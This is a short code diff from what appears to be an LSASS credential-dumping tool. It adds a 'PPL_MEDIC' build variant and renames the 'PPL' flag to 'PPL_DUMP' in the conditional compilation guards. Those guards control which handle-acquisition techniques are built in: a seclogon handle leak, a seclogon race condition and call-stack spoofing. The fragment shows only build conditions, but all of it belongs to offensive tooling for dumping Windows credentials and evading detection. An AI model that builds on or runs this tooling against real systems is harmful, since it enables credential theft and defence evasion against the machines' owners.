@@ -5,7 +5,7 @@
 #include "malseclogon.h"
 #include "spoof_callstack.h"
 
-#if defined(NANO) && !defined(SSP)
+#if (defined(NANO) || defined(PPL_MEDIC)) && !defined(SSP)
 
 BOOL find_token_handles_in_process(
     IN DWORD process_pid,
@@ -405,7 +405,7 @@ BOOL obtain_lsass_handle(
 
     if (use_seclogon_leak && !is_seclogon_leak_local_stage_2)
     {
-#ifndef PPL
+#if !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         success = malseclogon_handle_leak(
             seclogon_leak_remote_binary,
             dump_path,
@@ -539,7 +539,7 @@ HANDLE open_handle_to_lsass(
     if (is_malseclogon_stage_2)
     {
         // this is always done from an EXE
-#if defined(EXE) && defined(NANO) && !defined(SSP) && !defined(PPL)
+#if defined(EXE) && defined(NANO) && !defined(SSP) && !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = malseclogon_stage_2();
 #endif
     }
@@ -554,7 +554,7 @@ HANDLE open_handle_to_lsass(
     }
     else if (seclogon_race)
     {
-#if defined(NANO) && !defined(SSP) && !defined(PPL)
+#if defined(NANO) && !defined(SSP) && !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = malseclogon_race_condition(
             lsass_pid,
             permissions,
@@ -563,7 +563,7 @@ HANDLE open_handle_to_lsass(
     }
     else if (spoof_callstack)
     {
-#if !defined(PPL)
+#if !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = open_handle_with_spoofed_callstack(
             spoof_callstack,
             lsass_pid,
